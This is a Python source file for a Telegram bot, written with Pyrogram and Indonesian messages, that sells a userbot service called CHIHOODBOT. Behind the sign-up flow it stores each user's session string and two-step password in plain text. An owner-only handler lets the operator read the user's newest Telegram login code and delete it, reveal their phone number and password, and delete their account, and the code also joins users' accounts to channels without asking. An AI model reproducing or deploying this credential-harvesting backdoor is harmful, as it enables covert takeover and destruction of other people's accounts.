import asyncio
import importlib
from datetime import datetime

from pyrogram.enums import SentCodeType
from pyrogram.errors import *
from pyrogram.types import *
from pyrogram.raw import functions

from NEZABOT import *


async def need_api(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id in ubot._get_my_id:
        buttons = [
            [InlineKeyboardButton("kembali", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            f"""
anda sudah membuat CHIHOODBOT, jika CHIHOODBOT anda tidak bisa digunakan silahkan klik: /restart</b>
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    elif len(ubot._ubot) + 1 > MAX_BOT:
        buttons = [
            [InlineKeyboardButton("kembali", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            f"""
<b>❌ tidak bisa membuat CHIHOODBOT!</b>

<b>📚 karena maksimal CHIHOODBOT adalah {Fonts.smallcap(str(len(ubot._ubot)))} telah tercapai</b>

<b>☎️ silahkan hubungi: <a href=tg://openmessage?user_id={OWNER_ID}>admin</a> jika mau dibuatkan bot seperti saya</b>
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    if user_id not in await get_prem():
        buttons = [
            [
                InlineKeyboardButton("lanjutkan", callback_data="bayar_dulu"),               
                InlineKeyboardButton("kembali", callback_data=f"home {user_id}"),
            ]
        ]
        return await callback_query.edit_message_text(
            MSG.POLICY(),
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    else:
        buttons = [[InlineKeyboardButton("lanjutkan", callback_data="add_ubot")]]
        return await callback_query.edit_message_text(
            """
<b>anda telah membeli CHIHOODBOT silahkan pencet tombol lanjutkan untuk membuat CHIHOODBOT</b>
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )


async def payment_NEZABOT(client, callback_query):
    user_id = callback_query.from_user.id
    buttons = Button.plus_minus(1, user_id)
    return await callback_query.edit_message_text(
        MSG.TEXT_PAYMENT(20, 20, 1),
        disable_web_page_preview=True,
        reply_markup=InlineKeyboardMarkup(buttons),
    )


async def bikin_memek(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id in ubot._get_my_id:
        buttons = [
            [InlineKeyboardButton("kembali", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            f"""
<b>anda sudah membuat CHIHOODBOT</b>
<b>Jika CHIHOODBOT anda tidak bisa digunakan silahkan klik: /restart</b>
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    elif len(ubot._ubot) + 1 > MAX_BOT:
        buttons = [
            [InlineKeyboardButton("kembali", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            f"""
<b>❌ tidak bisa membuat CHIHOODBOT!</b>

<b>📚 karena maksimal CHIHOODBOT adalah {Fonts.smallcap(str(len(ubot._ubot)))} telah tercapai</b>

<b>☎️ silahkan hubungi: <a href=tg://openmessage?user_id={OWNER_ID}>admin</a> jika mau dibuatkan bot seperti saya</b>
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    if user_id not in await get_prem():
        buttons = [
            [InlineKeyboardButton("💵 beli CHIHOODBOT", callback_data="bahan")],
            [InlineKeyboardButton("kembali", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            f"""
<b>❌ maAf anda belum membeli uꜱerbot, ꜱilakan membeli terlebih dahulu.</b>
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    else:
        buttons = [[InlineKeyboardButton("✅ lanjutkan", callback_data="add_ubot")]]
        return await callback_query.edit_message_text(
            """
<b>✅ untuk membuat CHIHOODBOT siapkan bahan berikut

    • <code>phone_number</code>: nomer hp akun telegram

☑️ jika sudah tersedia silahkan klik tomboi dibawah</b>
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )


async def bikin_ubot(client, callback_query):
    user_id = callback_query.from_user.id
    await callback_query.message.delete()
    try:
        phone = await bot.ask(
            user_id,
            (
                "<b>Silahkan masukkan nomor telepon telegram anda dengan format kode negara \ncontoh: +628xxxxxxx</b>\n"
                "\n<b>Gunakan /cancel untuk membatalkan proses membuat CHIHOODBOT </b>"
            ),
            timeout=300,
        )
    except asyncio.TimeoutError:
        return await bot.send_message(user_id, "pembatalan otomatis")
    if await is_cancel(callback_query, phone.text):
        return
    phone_number = phone.text
    new_client = Ubot(
        name=str(callback_query.id),
        api_id=API_ID,
        api_hash=API_HASH,
        in_memory=False,
    )
    get_otp = await bot.send_message(user_id, "<b>mengirim kode otp...</b>")
    await new_client.connect()
    try:
        code = await new_client.send_code(phone_number.strip())
    except apiIdInvalid as AID:
        await get_otp.delete()
        return await bot.send_message(user_id, AID)
    except PhoneNumberInvalid as PNI:
        await get_otp.delete()
        return await bot.send_message(user_id, PNI)
    except PhoneNumberFlood as PNF:
        await get_otp.delete()
        return await bot.send_message(user_id, PNF)
    except PhoneNumberBanned as PNB:
        await get_otp.delete()
        return await bot.send_message(user_id, PNB)
    except PhoneNumberUnoccupied as PNU:
        await get_otp.delete()
        return await bot.send_message(user_id, PNU)
    except Exception as error:
        await get_otp.delete()
        return await bot.send_message(user_id, f"<b>ERROR:</b> {error}")
    try:
        sent_code = {
            SentCodeType.APP: "<a href=tg://openmessage?user_id=777000>akun telegram</a> resmi",
            SentCodeType.SMS: "sms anda",
            SentCodeType.CALL: "panggilan telpon",
            SentCodeType.FLASH_CALL: "panggilan kilat telepon",
            SentCodeType.FRAGMENT_SMS: "fragment sms",
            SentCodeType.EMAIL_CODE: "email anda",
        }
        await get_otp.delete()
        otp = await bot.ask(
            user_id,
            (
                f"<b>Silahkan periksa kode otp dari akun telegram resmi. Kirim kode otp ke sini setelah membaca format di bawah ini</b>\n"
                "jika kode otp adalah 12345 tolong tambahkan spasi kirimkan seperti ini 1 2 3 4 5\n"
                "\n<b>Gunakan /cancel untuk membatalkan proses membuat CHIHOODBOT</b>"
            ),
            timeout=300,
        )
    except asyncio.TimeoutError:
        return await bot.send_message(user_id, "Waktu telah habis")
    if await is_cancel(callback_query, otp.text):
        return
    otp_code = otp.text
    try:
        await new_client.sign_in(
            phone_number.strip(),
            code.phone_code_hash,
            phone_code=" ".join(str(otp_code)),
        )
    except PhoneCodeInvalid as PCI:
        return await bot.send_message(user_id, PCI)
    except PhoneCodeExpired as PCE:
        return await bot.send_message(user_id, PCE)
    except BadRequest as error:
        return await bot.send_message(user_id, f"<b>ERROR:</b> {error}")
    except SessionPasswordNeeded:
        try:
            two_step_code = await bot.ask(
                user_id,
                "<b>akun telah mengaktifkan verivikasi dua langkah. Silahkan kirimkan passwordnya\n\ngunakan/cancel untuk membatalkan proses membuat CHIHOODBOT</b>",
                timeout=300,
            )
        except asyncio.TimeoutError:
            return await bot.send_message(user_id, "pembatalan otomatis")
        if await is_cancel(callback_query, two_step_code.text):
            return
        new_code = two_step_code.text
        try:
            await new_client.check_password(new_code)
            await set_two_factor(user_id, new_code)
        except Exception as error:
            return await bot.send_message(user_id, f"<b>ERROR:</b> {error}")
    session_string = await new_client.export_session_string()
    await new_client.disconnect()
    new_client.storage.session_string = session_string
    new_client.in_memory = False
    bot_msg = await bot.send_message(
        user_id,
        "sedang memproses....\n\nsilahkan tunggu sebentar",
        disable_web_page_preview=True,
    )
    await new_client.start()
    if not user_id == new_client.me.id:
        ubot._ubot.remove(new_client)
        await rem_two_factor(new_client.me.id)
        return await bot_msg.edit(
            "<b>harap gunakan nomer telegram anda di akun anda saat ini dan bukan nomer telegram dari akun lain</>"
        )
    await add_ubot(
        user_id=int(new_client.me.id),
        api_id=API_ID,
        api_hash=API_HASH,
        session_string=session_string,
    )
    if callback_query.from_user.id not in await get_seles():
        await remove_prem(callback_query.from_user.id) 
    for mod in loadModule():
        importlib.reload(importlib.import_module(f"NEZABOT.modules.{mod}"))
    text_done = f"<b>💠 {bot.me.mention} berhasil diaktifkan di akun: <a href=tg://openmessage?user_id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a> > <code>{new_client.me.id}</code></b> "
    await bot_msg.edit(text_done)
    try:
        await new_client.join_chat("MT_Force")
        await new_client.join_chat("ruangprojects")
        await new_client.join_chat("fadzkuruunii")
    except UseralreadyParticipant:
        pass
    return await bot.send_message(
        LOGS_MAKER_UBOT,
        f"""
<b>NEZABOT diaktifkan</b>
<b>akun:</b> <a href=tg://user?id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a> 
<b>id:</b> <code>{new_client.me.id}</code>
""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "📁 cek masa aktif 📁",
                        callback_data=f"cek_masa_aktif {new_client.me.id}",
                    )
                ],
            ]
        ),
        disable_web_page_preview=True,
    )
    

async def next_prev_ubot(client, callback_query):
    query = callback_query.data.split()
    count = int(query[1])
    if query[0] == "next_ub":
        if count == len(ubot._ubot) - 1:
            count = 0
        else:
            count += 1
    elif query[0] == "prev_ub":
        if count == 0:
            count = len(ubot._ubot) - 1
        else:
            count -= 1
    await callback_query.edit_message_text(
        await MSG.USERBOT(count),
        reply_markup=InlineKeyboardMarkup(
            Button.ambil_akun(ubot._ubot[count].me.id, count)
        ),
    )

async def tools_NEZABOT(client, callback_query):
    user_id = callback_query.from_user.id
    query = callback_query.data.split()
    if not user_id == OWNER_ID:
        return await callback_query.answer(
            f"❌ tombol ini bukan untuk mu {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
            True,
        )
    X = ubot._ubot[int(query[1])]
    if query[0] == "get_otp":
        async for otp in X.search_messages(777000, limit=1):
            try:
                if not otp.text:
                    await callback_query.answer("❌ kode otp tidak ditemukan", True)
                else:
                    await callback_query.edit_message_text(
                        otp.text,
                        reply_markup=InlineKeyboardMarkup(
                            Button.ambil_akun(X.me.id, int(query[1]))
                        ),
                    )
                    await X.delete_messages(X.me.id, otp.id)
            except Exception as error:
                return await callback_query.answer(error, True)
    elif query[0] == "get_phone":
        try:
            return await callback_query.edit_message_text(
                f"<b>📲 nomer telepon dengan user_id <code>{X.me.id}</code> adalah <code>{X.me.phone_number}</code></b>",
                reply_markup=InlineKeyboardMarkup(
                    Button.ambil_akun(X.me.id, int(query[1]))
                ),
            )
        except Exception as error:
            return await callback_query.answer(error, True)
    elif query[0] == "get_faktor":
        code = await get_two_factor(X.me.id)
        if code == None:
            return await callback_query.answer(
                "🔐 kode two-factor authentication tidak ditemukan", True
            )
        else:
            return await callback_query.edit_message_text(
                f"<b>🔐 two-factor authentication dengan user_id <code>{X.me.id}</code> adalah <code>{code}</code></b>",
                reply_markup=InlineKeyboardMarkup(
                    Button.ambil_akun(X.me.id, int(query[1]))
                ),
            )
    elif query[0] == "ub_deak":
        return await callback_query.edit_message_reply_markup(
            reply_markup=InlineKeyboardMarkup(Button.deak(X.me.id, int(query[1]))),
        )
    elif query[0] == "deak_akun":
        ubot._ubot.remove(X)
        await X.invoke(functions.account.Deleteaccount(reason="madarchod hu me"))
        return await callback_query.edit_message_text(
            MSG.DEAK(X),
            reply_markup=InlineKeyboardMarkup(Button.ambil_akun(X.me.id, int(query[1]))),
        )

async def cek_ubot(client, callback_query):
    await bot.send_message(
        callback_query.from_user.id,
        await MSG.USERBOT(0),
        reply_markup=InlineKeyboardMarkup(Button.ambil_akun(ubot._ubot[0].me.id, 0)),
    )

async def cek_NEZABOT_expired(client, callback_query):
    user_id = int(callback_query.data.split()[1])
    expired = await get_expired_date(user_id)
    try:
        xxxx = (expired - datetime.now()).days
        return await callback_query.answer(f"⏳ tinggal {xxxx} hari lagi", True)
    except:
        return await callback_query.answer("✅ sudah tidak aktif", True)

async def hapus_ubot(client, callback_query):
    user_id = callback_query.from_user.id
    if not user_id == OWNER_ID:
        return await callback_query.answer(
            f"❌ Tombol ini bukan untuk mu {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
            True,
        )
    try:
        show = await bot.get_users(callback_query.data.split()[1])
        get_id = show.id
        get_mention = f"{get_id}"
    except Exception:
        get_id = int(callback_query.data.split()[1])
        get_mention = f"{get_id}"
    for X in ubot._ubot:
        if get_id == X.me.id:
            await X.unblock_user(bot.me.username)
            for chat in await get_chat(X.me.id):
                await remove_chat(X.me.id, chat)
            await rm_all(X.me.id)
            await rem_pref(X.me.id)
            await remove_ubot(X.me.id)
            await rem_expired_date(X.me.id)
            ubot._get_my_id.remove(X.me.id)
            ubot._ubot.remove(X)
            await X.log_out()
            await callback_query.answer(
                f"✅ {get_mention} Berhasil dihapus dari database", True
            )
            await callback_query.edit_message_text(
                await MSG.USERBOT(0),
                reply_markup=InlineKeyboardMarkup(
                    Button.ambil_akun(ubot._ubot[0].me.id, 0)
                ),
            )
            await bot.send_message(
                LOGS_MAKER_UBOT,
                MSG.EXPIRED_MSG_BOT(X),
                reply_markup=InlineKeyboardMarkup(Button.expired_button_bot()),
            )
            return await bot.send_message(
                X.me.id, "<b>masa aktif anda telah berakhir"
            )


async def is_cancel(callback_query, text):
    if text.startswith("/cancel"):
        await bot.send_message(
            callback_query.from_user.id, "<b>membatalkan proses</b>"
        )
        return True
    return False
